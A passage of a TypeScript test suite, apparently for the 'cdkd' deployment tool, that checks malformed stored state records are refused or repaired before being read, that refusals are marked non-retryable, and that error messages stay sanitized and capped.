    // `deleteState`s the original. They were left out of go-to-k/cdkd#3192 for
    // being in a real-AWS integ gate scope, not for taking a different answer.
    'src/deployment/deploy-engine.ts',
    'src/cli/commands/destroy-runner.ts',
  ];

  /**
   * The FIRST expression in each file that reads or carries the `outputs` bag.
   * The refusal has to DOMINATE it — the round-1 defect of go-to-k/cdkd#3018
   * was a guard sitting below the dereference it meant to protect, and a fence
   * that only checks the call exists stays green through exactly that move.
   */
  const FIRST_OUTPUTS_USE: Record<string, string> = {
    // The `isOutputSuppressed(...)` read in the Export.Name resolve loop —
    // TIGHTENED from `Object.keys(state.outputs` (review of
    // go-to-k/cdkd#3206), which sits ~5,500 stripped characters LATER, so a
    // guard moved between the two would have kept this fence green while the
    // bag was already read. Both are inside `scrubStack`; the earlier one is
    // the dominance question.
    'src/cli/commands/scrub.ts': 'state.outputs ?? {}',
    // The state literal that carries the bag into `saveState`.
    'src/cli/commands/import.ts': 'existingState?.outputs',
    // `rewriteResourceReferences`, which rebuilds the bag from
    // `Object.entries(state.outputs ?? {})` in `src/analyzer/orphan-rewriter.ts`.
    'src/cli/commands/orphan.ts': 'rewriteResourceReferences(',
    // go-to-k/cdkd#3207. The anchor is the LOADED record's bag in each file,
    // which is what the guard is about.
    //
    // `deploy-engine.ts` also has `redactStateForPersist`'s
    // `this.redactOutputs(state.outputs)` textually EARLIER, and it is
    // deliberately not the anchor: that is a helper reading whatever bag it is
    // HANDED, the same relationship `orphan.ts`'s `rewriteResourceReferences`
    // has, and every state it is handed is derived from `currentState` after
    // this guard. `currentState.outputs` is the first read of the loaded bag.
    'src/deployment/deploy-engine.ts': 'currentState.outputs',
    // The strong-reference decision, which is the ONLY thing this runner does
    // with the bag.
    'src/cli/commands/destroy-runner.ts': 'state.outputs && Object.keys(',
  };

  it('rollback.ts is OUT of the outputs population because it reads no outputs', () => {
    // The premise of the exclusion, asserted rather than assumed. If this file
    // ever starts reading or rebuilding the bag, it joins `OUTPUTS_REFUSE` —
    // it already calls `saveState`, so the refuse side is settled for it.
    const src = code('src/cli/commands/rollback.ts');
    expect(
      src.includes('.outputs'),
      'src/cli/commands/rollback.ts now reads `outputs`. It calls saveState, so it must refuse a ' +
        'malformed bag: add it to OUTPUTS_REFUSE with its first dereference as the anchor.'
    ).toBe(false);
    expect(src, 'rollback.ts no longer calls saveState').toContain('saveState(');
  });

  for (const file of OUTPUTS_REFUSE) {
    it(`${file} REFUSES a malformed \`outputs\` bag — it can saveState`, () => {
      const src = code(file);
      // THREE spellings now. Most files call the shared helper; `scrub`
      // branches on the exported predicate and raises its OWN exit-2 class,
      // because its exit 1 is spoken for; and go-to-k/cdkd#3207 added
      // `destroy-runner.ts`, which refuses through a SIBLING helper carrying a
      // different TEXT (a destroy clears the bag rather than rebuilding it, so
      // the shared sentence would state a mechanism that never happens). All
      // three delegate to `hasReadableOutputs`, which is what keeps the VERDICT
      // singular while the message varies.
      const refuses =
        REFUSAL_SPELLINGS.some((call) => src.includes(call)) ||
        (src.includes('hasReadableOutputs(') && src.includes('malformedOutputsRefusalMessage('));
      expect(
        refuses,
        `${file} calls saveState and reads the outputs bag, so a malformed one must be REFUSED, ` +
          `not repaired: this command rebuilds the bag before saving, so a string is written ` +
          `back as a well-formed map and the damaged record is laundered permanently. Call ` +
          `refuseMalformedOutputs(), or branch on hasReadableOutputs() and raise your own class ` +
          `around malformedOutputsRefusalMessage().`
      ).toBe(true);

      // Only `scrub` may ALSO hold the repair helper, and only because its
      // write gate proves `--dry-run` cannot persist. The same carve-out, and
      // the same reason, as the resources half one describe up.
      if (file !== 'src/cli/commands/scrub.ts') {
        expect(
          src.includes('repairMalformedOutputsForReadOnly'),
          `${file} repairs a malformed outputs bag but can also WRITE state.`
        ).toBe(false);
      } else {
        // The repair must not be able to end in a CLEAN verdict: the finding
        // has to reach a non-zero exit, or `--dry-run --fail` reports a stack
        // clean whose stored outputs it never read.
        expect(
          src,
          'scrub no longer carries the outputs repair out to its caller; `--dry-run --fail` ' +
            'would exit 0 over a record whose outputs it replaced with {}.'
        ).toContain('malformedOutputs');
        expect(
          src,
          'the outputs finding no longer reaches the audited-record refusal.'
        ).toContain('malformedOutputRecords.length > 0');
        // SCOPED to the builder, and keyed on the SENTENCE rather than on the
        // identifier: `malformedOrphanRecords.length > 0` also occurs in the
        // dry-run branch above, so a whole-file `toContain` stays green when
        // the audited-error arm or its sentence is deleted (measured — this
        // fence read that way for one round).
        const builderAt = src.indexOf('function malformedRecordsAuditedError');
        expect(
          builderAt,
          'malformedRecordsAuditedError was renamed; this fence is reading nothing.'
        ).toBeGreaterThan(-1);
        const builder = src.slice(builderAt, src.indexOf('\nfunction ', builderAt + 1));
        expect(
          builder,
          'the audited-record refusal no longer has an orphans sentence, so a run that audited ' +
            'a record with an unreadable orphans container reports it clean.'
        ).toContain('EMPTY orphan list');
        expect(
          builder,
          'the orphans list is not a parameter of the audited-record refusal, so its sentence ' +
            'cannot name the records it covers.'
        ).toContain('orphanStackNames');
        // ...and both call sites must pass it, or the builder's arm is dead.
        const callSites = src.split('malformedRecordsAuditedError(').length - 2;
        expect(callSites, 'the audited-record refusal lost a call site').toBeGreaterThanOrEqual(2);
        expect(
          src.split('malformedOrphanRecords\n').length - 1 + src.split('malformedOrphanRecords,').length - 1,
          'a call site no longer passes the orphans list, so that run reports a clean record it ' +
            'could not read.'
        ).toBeGreaterThanOrEqual(callSites);
      }

      expect(src, `${file} no longer calls saveState`).toContain('saveState(');

      // `scrub` additionally LISTS the records it could not certify, in an
      // audited-record refusal raised above `scrubStack`'s seam — so no
      // behavioural case in this repo reaches it, and it interpolated stack
      // names RAW from go-to-k/cdkd#3018 until go-to-k/cdkd#3206's review. A
      // source fence is what fits: the names must go through a SHARED helper
      // that sanitizes, caps and stands in `UNRENDERABLE` — `displayIdent`,
      // which also JSON-quotes any name that needs it, so a name carrying the
      // list's delimiter cannot forge an entry — not a bare `.join`, and not a local half-copy that sanitizes
      // without capping, which is exactly what the first fix shipped.
      if (file === 'src/cli/commands/scrub.ts') {
        expect(
          src,
          'scrub lists malformed records with a bare join, so a stack name reaches the refusal ' +
            'unsanitized and uncapped.'
        ).not.toMatch(/\$\{(stackNames|outputStackNames)\.join\(/);
        // Anchored on the ARROW BODY, not a bare identifier: `src` is
        // comment-stripped, but the name also appears in ordinary code
        // elsewhere in the file, so a bare `toContain` would be satisfied by a
        // use that has nothing to do with this list (round-4 nit).
        expect(
          src,
          'scrub no longer renders the audited-record name list through a sanitizing, capping, ' +
            'BOUNDED helper, so a stack name can reach the refusal unbounded — or, hand-quoted, ' +
            'forge extra list entries.'
        ).toMatch(/names\.map\(\(n\) => displayIdent\(n\)\)/);
      }

      // DOMINANCE.
      // The LAST position any accepted spelling occupies — `Math.max`, so a
      // file holding two cannot satisfy the bound on the earlier one alone.
      //
      // Taken over the spellings PRESENT, and the presence half is the point:
      // `indexOf` answers `-1` for an absent one, and `-1` is less than every
      // dereference index, so a fence reading a fixed pair would pass
      // VACUOUSLY on a file refusing through a third spelling. go-to-k/cdkd#3207
      // added exactly such a file.
      const positions = [...REFUSAL_SPELLINGS, 'hasReadableOutputs(']
        .map((call) => src.indexOf(call))
        .filter((at) => at > -1);
      expect(
        positions.length,
        `${file} contains none of the refusal spellings this fence knows about, so its ` +
          `dominance check would pass over nothing. Add the spelling to REFUSAL_SPELLINGS.`
      ).toBeGreaterThan(0);
      const refusalAt = Math.max(...positions);
      const derefAt = FIRST_OUTPUTS_USE[file]!;
      const derefIndex = src.indexOf(derefAt);
      expect(
        derefIndex,
        `${file} no longer contains its first outputs use \`${derefAt}\`; this fence's anchor ` +
          `is stale and it is no longer checking dominance.`
      ).toBeGreaterThan(-1);
      expect(
        refusalAt,
        `${file} refuses AFTER its first \`outputs\` use (\`${derefAt}\`), so the bag is already ` +
          `read — or rebuilt — one line above the refusal.`
      ).toBeLessThan(derefIndex);
    });
  }

  /**
   * The four go-to-k/cdkd#3207 sites that call NO `saveState`, so the
   * `OUTPUTS_REFUSE` loop's own premise assertion cannot hold for them — yet
   * two of them still REFUSE and two still REPAIR, and the reasons are
   * per-site rather than mechanical. Each gets its own case stating the
   * premise it actually rests on.
   */
  it('src/provisioning/providers/nested-stack-provider.ts REFUSES — its caller persists the result', () => {
    const file = 'src/provisioning/providers/nested-stack-provider.ts';
    const src = code(file);
    // The premise: it writes no state itself. If that ever stops being true it
    // belongs in OUTPUTS_REFUSE with the rest.
    expect(
      src.includes('saveState('),
      `${file} now writes state directly; move it into OUTPUTS_REFUSE.`
    ).toBe(false);
    expect(
      src.includes('refuseMalformedNestedChildOutputs('),
      `${file} rebuilds the PARENT's Outputs.<Key> attributes from the CHILD's bag and the ` +
        `parent's deploy PERSISTS them, so a malformed child bag must be refused rather than ` +
        `walked — 'Object.entries' turns a six-character bag into six fabricated attributes ` +
        `that Fn::GetAtt then resolves into live AWS calls.`
    ).toBe(true);
    expect(
      src.includes('repairMalformedOutputsForReadOnly'),
      `${file} repairs the child's bag, which puts a well-formed fabricated attribute set into ` +
        `the parent's record with nothing left to say the child was damaged.`
    ).toBe(false);
    // DOMINANCE against the first read of the child's bag.
    const derefAt = 'childStateData.state.outputs';
    const derefIndex = src.indexOf(derefAt);
    expect(
      derefIndex,
      `${file} no longer contains \`${derefAt}\`; this fence's anchor is stale.`
    ).toBeGreaterThan(-1);
    expect(src.indexOf('refuseMalformedNestedChildOutputs(')).toBeLessThan(derefIndex);
  });

  it('src/deployment/intrinsic-function-resolver.ts REFUSES its Fn::GetStackOutput read', () => {
    const file = 'src/deployment/intrinsic-function-resolver.ts';
    const src = code(file);
    // The ONE reader in this class that RE-APPLIES rather than displays:
    // `Object.hasOwn('abcdef', '0')` is true, so a fabricated character
    // resolves into a consumer's template and the deploy sends it to AWS.
    expect(
      src.includes('hasReadableOutputs('),
      `${file} no longer tests the producer's bag through the shared predicate, so an ` +
        `Fn::GetStackOutput can again resolve one CHARACTER of a damaged record as its value.`
    ).toBe(true);
    expect(
      src.includes('MalformedProducerRecordRefusalError'),
      `${file} no longer raises the dedicated class, so 'cdkd scrub' can no longer tell this ` +
        `refusal from its user-fixable siblings and refuses the whole consumer stack.`
    ).toBe(true);
    // DOMINANCE against the first read of the producer's bag. Both the
    // membership test and the `describeAvailableOutputs` echo sit below it.
    const derefAt = 'stateData.state.outputs';
    const derefIndex = src.indexOf(derefAt);
    expect(
      derefIndex,
      `${file} no longer contains \`${derefAt}\`; this fence's anchor is stale.`
    ).toBeGreaterThan(-1);
    expect(
      src.indexOf('hasReadableOutputs('),
      `${file} tests the bag AFTER reading it, so the fabricated key list is already built.`
    ).toBeLessThan(derefIndex);
  });

  /**
   * The two `cdkd local` readers REPAIR and WARN, and the premise is narrower
   * than "it never writes": a `cdkd local` run CAN write one DERIVED key,
   * `cdkd/_index/<region>/exports.json`, because `ExportIndexStore.load`
   * rebuilds and PUTs the index on a miss. That write is separately fail-closed
   * (`hasReadableExportSet`), so nothing on this path can launder a RECORD —
   * which is what makes repair safe here. Asserting `ExportIndexStore` absent
   * would be asserting something false.
   */
  const OUTPUTS_LOCAL_REPAIR = [
    'src/cli/commands/local-state-loader.ts',
    'src/local/s3-local-state-provider.ts',
  ];

  for (const file of OUTPUTS_LOCAL_REPAIR) {
    it(`${file} REPAIRS and WARNS — it writes no state record`, () => {
      const src = code(file);
      expect(
        src.includes('saveState('),
        `${file} now writes a state record, so reading a damaged bag as empty can launder it — ` +
          `it must refuse instead.`
      ).toBe(false);
      expect(
        src.includes('hasReadableOutputs(') || src.includes('repairMalformedOutputsForReadOnly('),
        `${file} no longer tests the bag through the shared predicate, so 'Object.entries' / ` +
          `'in' walk a string or a list and fabricate one local output per character.`
      ).toBe(true);
      expect(
        src.includes('malformedLocalOutputsWarning('),
        `${file} reads a damaged bag as EMPTY silently. An empty map is indistinguishable from ` +
          `a stack that publishes no outputs, so nothing ever names the damaged record.`
      ).toBe(true);
      expect(
        REFUSAL_SPELLINGS.some((call) => src.includes(call)),
        `${file} REFUSES a damaged bag. It is a read-only local path, and refusing there makes ` +
          `a 'cdkd local' run unusable over a record the user may not own.`
      ).toBe(false);
    });
  }

  it('the local loader keeps `Object.hasOwn`, not `in`, for its template-controlled key', () => {
    // `in` walks the prototype chain, so an `OutputName: 'toString'` answered
    // TRUE on a healthy bag and the arm returned a FUNCTION — the issue #2767
    // class, one command over.
    const src = code('src/cli/commands/local-state-loader.ts');
    expect(src).toContain('Object.hasOwn(outputs, outputName)');
    expect(
      /\boutputName in /.test(src),
      `src/cli/commands/local-state-loader.ts is back to an 'in' membership test on a ` +
        `template-controlled key.`
    ).toBe(false);
  });

  /**
   * The exports index takes NEITHER answer, and the third disposition is the
   * per-site decision go-to-k/cdkd#3192 exists to make rather than an omission.
   */
  it('src/state/export-index-store.ts fails CLOSED and SAYS so, refusing nothing', () => {
    const src = code('src/state/export-index-store.ts');
    expect(
      src.includes('hasReadableExportSet('),
      `the exports-index rebuild no longer tests the producer record's export set, so a ` +
        `hand-edited one publishes a fabricated export per character into the shared index.`
    ).toBe(true);
    expect(
      src.includes('malformedExportSourceWarning('),
      `the exports-index rebuild drops a damaged producer SILENTLY. An empty contribution is ` +
        `indistinguishable from a stack that exports nothing, so the next Fn::ImportValue miss ` +
        `names the CONSUMER and nothing ever names this record.`
    ).toBe(true);
    // And it must NOT refuse: this rebuild serves every producer in the region.
    expect(
      src.includes('refuseMalformedOutputs('),
      `the exports-index rebuild now REFUSES on a malformed record, which takes every other ` +
        `stack's Fn::ImportValue resolution down with it.`
    ).toBe(false);
  });

  /**
   * The second line of defence, and the reason it is not a substitute for the
   * one above: `computeOutputsDiff` is the WALK, and a walk-site guard cannot
   * see the lookups its caller already made.
   */
  it('src/analyzer/outputs-diff.ts admits the stored bag through the SHARED predicate', () => {
    const src = code('src/analyzer/outputs-diff.ts');
    const at = src.indexOf('export function computeOutputsDiff');
    expect(at, 'computeOutputsDiff was renamed; this fence reads its body').toBeGreaterThan(-1);
    // BOUNDED at the next top-level export, not sliced to EOF. The function is
    // the last export today, so an unbounded slice has an empty blind spot —
    // but appending anything after it would let a REVERTED computeOutputsDiff
    // satisfy the check below out of the new function's body (review of
    // go-to-k/cdkd#3194).
    const next = src.indexOf('\nexport ', at + 1);
    const body = next === -1 ? src.slice(at) : src.slice(at, next);
    expect(
      /isReadableBag\(\s*current\s*\)/.test(body),
      `computeOutputsDiff no longer tests the stored bag with isReadableBag. A bare \`?? {}\` ` +
        `covers null and undefined only, so a string or a list is enumerated and fabricates one ` +
        `REMOVE row per character or element (go-to-k/cdkd#3189).`
    ).toBe(true);
    // The exact spelling this replaced, refused by name: it reads as a guard,
    // admits every non-nullish shape, and is what shipped the defect.
    expect(
      /currentBag\s*=\s*current\s*\?\?/.test(body),
      `computeOutputsDiff is back to \`current ?? {}\` for the stored bag.`
    ).toBe(false);
    // And through the SHARED predicate, not a second spelling of it beside the
    // one `isReadableBag`'s export note exists to keep singular.
    expect(
      src.includes(`from '../state/malformed-resources-bag.js'`),
      `src/analyzer/outputs-diff.ts no longer imports the shared predicate.`
    ).toBe(true);
  });
});

describe('the retried refusals are marked non-retryable (issue #3207)', () => {
  // Both of these fire INSIDE a `withRetry` path -- `NestedStackProvider.delete`
  // reaches `runDestroyForStack`, and `readChildOutputsAsAttributes` runs inside
  // the deploy engine's retry wrapper. Without the marker, classification falls
  // to the SUBSTRING matchers, and `does not exist` / `DependencyViolation` are
  // live patterns in `RETRYABLE_ERROR_MESSAGE_PATTERNS` that a template-derived
  // child name (`<parent>~<LogicalId>`) can put in the message. A deterministic
  // refusal would then be retried on a full schedule. Issue #1838's shape.
  //
  // Two-sided on purpose: the CAP is that each refusal carries the marker, and
  // the FLOOR is that a healthy bag raises nothing at all -- a guard that threw
  // unconditionally would satisfy the cap alone.
  //
  // The table is DERIVED against the module's own export list below, so a
  // refusal added later cannot join the family unmarked and unnoticed — which
  // is exactly what happened to `refuseMalformedOutputs`, marked only by
  // go-to-k/cdkd#3161's review round after shipping unmarked through
  // go-to-k/cdkd#3192 and #3207.
  const RETRIED = [
    ['destroy outputs', () => refuseMalformedOutputsForDestroy({ outputs: 'abcdef' as unknown as Record<string, unknown> }, 'S', 'us-east-1')],
    ['nested child outputs', () => refuseMalformedNestedChildOutputs({ outputs: 'abcdef' as unknown as Record<string, unknown> }, 'P~C', 'us-east-1')],
    ['deploy outputs', () => refuseMalformedOutputs({ outputs: 'abcdef' as unknown as Record<string, unknown> }, 'S', 'us-east-1')],
    ['destroy resources', () => refuseMalformedResourcesForDestroy(state('abcdef'), 'S', 'us-east-1')],
    ['deploy resources', () => refuseMalformedResourcesForDeploy(state('abcdef'), 'S', 'us-east-1')],
    ['resource properties', () => refuseMalformedResourceProperties(state({ A: { physicalId: 'p', resourceType: 'T', properties: 'x' } }), 'S', 'us-east-1')],
    ['orphans container', () => refuseMalformedOrphans({ orphans: 'abc' as unknown as StackState['orphans'] }, 'S', 'us-east-1')],
    ['destroy orphans container', () => refuseMalformedOrphansForDestroy({ orphans: 'abc' as unknown as StackState['orphans'] }, 'S', 'us-east-1')],
  ] as const;

  /**
   * The COVERAGE half, and the reason the table above is not just a list.
   *
   * Every refusal this module exports rides a `withRetry` path at one caller
   * or another, so the marker is the rule and its absence is the exception —
   * `UNMARKED` is that exception, by NAME and with the reason, and the
   * derivation asserts the two sets PARTITION the exports. Without it a
   * seventh refusal lands unmarked and nothing says so, which is precisely how
   * `refuseMalformedOutputs` — reached from `cdkd deploy`, and therefore from
   * a nested child's deploy inside the parent's `withRetry(provider.create)` —
   * shipped unmarked beside three marked siblings.
   */
  const UNMARKED: Record<string, string> = {
    'refuseMalformedState(':
      'its callers are `cdkd import`, `cdkd orphan`, `cdkd rollback`, `cdkd state ' +
      'refresh-observed` and `cdkd drift --accept` / `--revert`, none of which wraps the call ' +
      'in withRetry — so the marker would fence nothing. Revisit if a retrying caller is added.',
    'refuseMalformedResourcePropertiesForOrphan(':
      'go-to-k/cdkd#3318. Its ONE caller is `cdkd orphan`, raising from the command body beside ' +
      'the exempt sibling above — `rewriteResourceReferences` is called from nowhere else, so ' +
      'no withRetry encloses it and the marker would fence nothing. Revisit if a retrying ' +
      'caller is added.',
    'refuseMalformedResourceEntries(':
      'its callers are `cdkd state refresh-observed` (the multi-stack pre-check and the per-stack ' +
      'refresh) and `cdkd drift --accept` / `--revert`, none of which wraps the call in withRetry ' +
      '— drift retries only the provider update, well after this refusal. Revisit if a retrying ' +
      'caller is added.',
  };

  it('every refusal the module exports is either marked or a NAMED exception', () => {
    const moduleSrc = code('src/state/malformed-resources-bag.ts');
    const exported = [...moduleSrc.matchAll(/export function (refuseMalformed\w*)\(/g)].map(
      (m) => `${m[1]!}(`
    );
    expect(exported.length, 'the grep stopped matching; this fence is reading nothing').toBe(11);
    // A refusal is MARKED when its body reaches `markNonRetryable`. Read from
    // the body rather than from the RETRIED table, so the two instruments stay
    // independent — the table proves the marker is SET at runtime, this proves
    // no export was left out of the table by omission.
    const marked = exported.filter((name) => {
      const at = moduleSrc.indexOf(`export function ${name.slice(0, -1)}(`);
      const end = moduleSrc.indexOf('\nexport function ', at + 1);
      const body = moduleSrc.slice(at, end === -1 ? undefined : end);
      return body.includes('markNonRetryable(');
    });
    const unmarked = exported.filter((n) => !marked.includes(n));
    expect(
      unmarked.sort(),
      'a refusal is neither marked non-retryable nor listed in UNMARKED with a reason. Every ' +
        'one of these decides from a PERSISTED record, so a retry cannot change the verdict, ' +
        'while the message interpolates identifiers a SUBSTRING-matching classifier reads as ' +
        'transient (issue #1838).'
    ).toEqual(Object.keys(UNMARKED).sort());
    // And the exception must carry a reason of real length, not a bare entry.
    for (const [name, reason] of Object.entries(UNMARKED)) {
      expect(reason.length, `${name}'s exemption has no stated reason`).toBeGreaterThan(40);
    }
    // Non-vacuity: the RETRIED table must cover every MARKED export, or the
    // runtime half silently shrinks while this source half stays green.
    expect(RETRIED.length, 'RETRIED no longer drives every marked refusal').toBe(marked.length);
  });

  it.each(RETRIED)('%s refuses with the non-retryable marker set', (_label, raise) => {
    let thrown: unknown;
    try {
      raise();
    } catch (e) {
      thrown = e;
    }
    expect(thrown, 'the refusal did not fire, so the marker assertion is vacuous').toBeDefined();
    expect(isMarkedNonRetryable(thrown)).toBe(true);
  });

  it.each(RETRIED)('%s: the family raises nothing for a readable bag', (_label, _raise) => {
    expect(() => refuseMalformedOutputsForDestroy({ outputs: { A: 'v' } }, 'S', 'us-east-1')).not.toThrow();
    expect(() =>
      refuseMalformedNestedChildOutputs({ outputs: { A: 'v' } }, 'P~C', 'us-east-1')
    ).not.toThrow();
  });
});

/**
 * The `properties` container (issue
 * [go-to-k/cdkd#3191](https://github.com/go-to-k/cdkd/issues/3191)) — a THIRD
 * container, one level down from the two above, on each resource ENTRY.
 */
function withProperties(properties: unknown, extra: Record<string, unknown> = {}): StackState {
  return state({
    A: { physicalId: 'p', resourceType: 'T', properties },
    ...extra,
  });
}

describe('unreadableResourcePropertyBags (issue go-to-k/cdkd#3191)', () => {
  for (const [label, value] of UNREADABLE) {
    it(`names an entry whose bag is ${label}`, () => {
      expect(unreadableResourcePropertyBags(withProperties(value))).toEqual(['A']);
    });
  }

  it('names nothing for a populated bag', () => {
    expect(unreadableResourcePropertyBags(withProperties({ K: 'v' }))).toEqual([]);
  });

  it('names nothing for an EMPTY bag — {} is a legitimate declared-nothing record', () => {
    // The shape closest to the defect, and the one a widened predicate would
    // catch: a resource that genuinely declares no properties must keep
    // deploying.
    expect(unreadableResourcePropertyBags(withProperties({}))).toEqual([]);
  });

  it('SKIPS an entry that is not a readable object, leaving that class to its own guard', () => {
    // A `null` entry has no `properties` to test and a string entry's would be
    // a per-character read of the entry's own defect, so naming either here
    // would report this container for another one's damage. That keeps this
    // verdict independent of the entry guard for every NON-object entry — the
    // case below is the one shape where it is not.
    expect(unreadableResourcePropertyBags(state({ A: null, B: 'torn', C: 5 }))).toEqual([]);
  });

  it('STILL names a typeless OBJECT entry whose map is torn — the deploy path has no entry guard', () => {
    // The overlap with the entry guard, kept on purpose. `DiffCalculator` takes
    // this predicate WITHOUT `unreadableResourceEntries`, so narrowing the
    // object test here to "a readable resource entry" would let a typeless
    // object with a torn map reach the comparison unrefused. The typed torn
    // row is the control that the case is not satisfied by naming everything.
    expect(
      unreadableResourcePropertyBags(
        state({
          A: { physicalId: 'p', properties: 'x' },
          B: { physicalId: 'p', resourceType: 'T', properties: { K: 'v' } },
        })
      )
    ).toEqual(['A']);
  });

  for (const [label, value] of UNREADABLE) {
    it(`returns [] rather than ids invented from a ${label} resources BAG`, () => {
      // A string bag would otherwise yield one "logical id" per character.
      expect(unreadableResourcePropertyBags(state(value))).toEqual([]);
    });
  }

  it('names every damaged entry, in record order', () => {
    expect(
      unreadableResourcePropertyBags(
        state({
          A: { physicalId: 'p', resourceType: 'T', properties: 'x' },
          B: { physicalId: 'p', resourceType: 'T', properties: { K: 'v' } },
          C: { physicalId: 'p', resourceType: 'T', properties: null },
        })
      )
    ).toEqual(['A', 'C']);
  });
});

describe('refuseMalformedResourceProperties (issue go-to-k/cdkd#3191)', () => {
  it('throws the shared code, marked non-retryable', () => {
    let thrown: unknown;
    try {
      refuseMalformedResourceProperties(withProperties('x'), 'S', 'us-east-1');
    } catch (e) {
      thrown = e;
    }
    expect(thrown).toBeInstanceOf(CdkdError);
    expect((thrown as CdkdError).code).toBe(STATE_RESOURCES_MALFORMED);
    // A verdict taken from a PERSISTED record cannot change on a retry, and
    // the message interpolates record-derived text a substring-matching retry
    // classifier reads as transient (issue #1838).
    expect(isMarkedNonRetryable(thrown as Error)).toBe(true);
  });

  it('does not throw for a healthy record', () => {
    expect(() =>
      refuseMalformedResourceProperties(withProperties({ K: 'v' }), 'S', 'us-east-1')
    ).not.toThrow();
  });

  it('does not throw for an unreadable resources BAG — that is refuseMalformedState', () => {
    // Taking only ONE of the two guards is the caller error both predicates'
    // docs warn about; this pins that THIS one stays silent rather than
    // inventing per-character ids.
    expect(() => refuseMalformedResourceProperties(state('ab'), 'S', 'us-east-1')).not.toThrow();
  });
});

describe('repairMalformedResourcePropertiesForReadOnly (issue go-to-k/cdkd#3191)', () => {
  it('empties each unreadable bag and returns the ids', () => {
    const s = withProperties('abcdef', {
      B: { physicalId: 'p', resourceType: 'T', properties: { K: 'v' } },
    });
    expect(repairMalformedResourcePropertiesForReadOnly(s)).toEqual(['A']);
    expect(s.resources['A']!.properties).toEqual({});
    // A REPAIR of the bag, not a DROP of the entry: the row still names a real
    // resource and belongs in the diff, and dropping it would preview a CREATE
    // the next deploy does not make.
    expect(s.resources['A']!.resourceType).toBe('T');
    expect(s.resources['A']!.physicalId).toBe('p');
  });

  it('leaves a healthy bag byte-identical and reports no repair', () => {
    const bag = { K: 'v' };
    const s = withProperties(bag);
    expect(repairMalformedResourcePropertiesForReadOnly(s)).toEqual([]);
    expect(s.resources['A']!.properties).toBe(bag);
  });
});

describe('the malformed-properties texts (issue go-to-k/cdkd#3191)', () => {
  it('the REFUSAL names no stack at all when the caller holds no trusted one', () => {
    // `src/analyzer/diff-calculator.ts` is that caller: the only identity in
    // its reach is the record's own unvalidated `stackName` / `region`, so a
    // planted pair would aim the pasteable remedy at a different, healthy
    // stack. It passes neither, and the text degrades to a TEMPLATE.
    // `ParamZeta`, not `A`: the clause itself says "declares as ADDED" and "is
    // A REPLACEMENT", so `toContain('A')` passes even when the id list renders
    // NOTHING. The sibling file (`diff-recursive-malformed-properties.test.ts`)
    // documents that trap and picks this same id for it; the rule just had not
    // been applied here.
    const text = malformedResourcePropertiesRefusalMessage(undefined, undefined, ['ParamZeta']);
    expect(text).toContain('The state record this command loaded holds 1 resource record(s)');
    expect(text).toContain('cdkd state show \'<stack>\' --stack-region \'<region>\' --json');
    expect(text).toContain('ParamZeta');
    expect(text.split('\n')).toHaveLength(1);
  });

  it('states the consequence the OTHER containers cannot produce', () => {
    // Deliberately NOT `malformedStateRefusalMessage`'s wording: an unreadable
    // `resources` MAP reads as an empty stack, while this reads as a resource
    // whose declared properties are all missing — a REPLACEMENT, not a
    // re-create-the-world.
    const text = malformedResourcePropertiesRefusalMessage('S', 'us-east-1', ['A']);
    expect(text).toContain('REPLACEMENT of the live resource');
    // The negative is pinned against the SIBLING's real wording, taken from
    // `malformedStateRefusalMessage` itself so it cannot go stale. An earlier
    // revision asserted a phrase that exists in no `src/` file, so it stayed
    // green even against the merge it exists to prevent (review of #3191).
    expect(malformedStateRefusalMessage('S', 'us-east-1')).toContain(
      'replace the evidence with a well-formed empty one'
    );
    expect(text).not.toContain('replace the evidence with a well-formed empty one');
  });

  it('records why repairing is not the safe alternative for this container', () => {
    // The measurement that settled the contract: a stored `[]` or `5`
    // enumerates no keys, so it IS the repaired-to-empty case, and it still
    // reached `requiresReplacement: true`. A later lane that swaps the refusal
    // for a `?? {}` has to delete this sentence to do it.
    expect(malformedResourcePropertiesRefusalMessage('S', 'us-east-1', ['A'])).toContain(
      'reading the bag as empty produces that same verdict'
    );
  });

  it('warns that the PREVIEW is wrong and that deploy refuses on the same defect', () => {
    const text = malformedResourcePropertiesWarning('S', 'us-east-1', ['A']);
    expect(text).toContain('Continuing with those maps EMPTY');
    expect(text).toContain("Do NOT run 'cdkd deploy' against this record");
    // The `Inspect ... with:` line it ends on, which go-to-k/cdkd#3363's
    // `commandHole` sweep changed through the SHARED `inspectCommand` — this
    // builder's copy of that line had no assertion at all, so its text moved
    // silently (go-to-k/cdkd#3439). The substituted arm and the no-identity
    // arm, whose holes must be quoted: bare ones are shell redirections.
    expect(text).toContain('See the stored values with: cdkd state show S --stack-region us-east-1 --json');
    expect(malformedResourcePropertiesWarning(undefined, undefined, ['A'])).toContain(
      "See the stored values with: cdkd state show '<stack>' --stack-region '<region>' --json"
    );
  });

  it('caps the named ids and says how many it left out', () => {
    // A record whose 500 resources were all hand-edited must not push the
    // remedy command off the reader's screen.
    const ids = Array.from({ length: 9 }, (_, i) => `R${i}`);
    const text = malformedResourcePropertiesRefusalMessage('S', 'us-east-1', ids);
    expect(text).toContain('9 resource record(s)');
    expect(text).toContain('R4');
    expect(text).not.toContain('R5');
    expect(text).toContain('and 4 more');
  });

  it('says nothing about "more" when every id is named', () => {
    const text = malformedResourcePropertiesRefusalMessage('S', 'us-east-1', ['A', 'B']);
    expect(text).not.toContain('more');
  });

  // The four properties `safeIdentifier`'s note requires of every message in
  // this module, applied to BOTH new builders — the module's own `TEXTS` loop
  // is hand-listed and these two were missing from it (review of #3191).
  /**
   * The line-forgery invariant, per builder. The prose is ONE line in all
   * three; the orphan refusal then appends its own pasteable commands, each on
   * a trailing line of its own behind a fixed label (emitted LAST and UNWRAPPED
   * since go-to-k/cdkd#3363's review). So a hostile value may add no line at
   * all, and every extra line must be one of those labelled commands.
   */
  function expectNoForgedLines(build: unknown, text: string, benign: string): void {
    const lines = text.split('\n');
    if (build !== malformedOrphanResourcePropertiesRefusalMessage) {
      expect(lines).toHaveLength(1);
      return;
    }
    // The SAME labelled lines, in the same order, as an equivalent benign input
    // produces — matching an allowed prefix alone would accept a forged extra
    // `Drop the record:` line.
    const labelsOf = (t: string): string[] =>
      t
        .split('\n')
        .slice(1)
        .map((l) => l.slice(0, l.indexOf(': ')));
    expect(labelsOf(text)).toEqual(labelsOf(benign));
    expect(labelsOf(benign).length).toBeGreaterThan(0);
    for (const line of lines.slice(1)) {
      expect(line, line).toMatch(
        /^((Drop the record|Find the exact name|Inspect the record): cdkd |(Object key|State bucket): \S)/
      );
    }
  }

  for (const build of [
    malformedResourcePropertiesRefusalMessage,
    malformedResourcePropertiesWarning,
    malformedOrphanResourcePropertiesRefusalMessage,
  ]) {
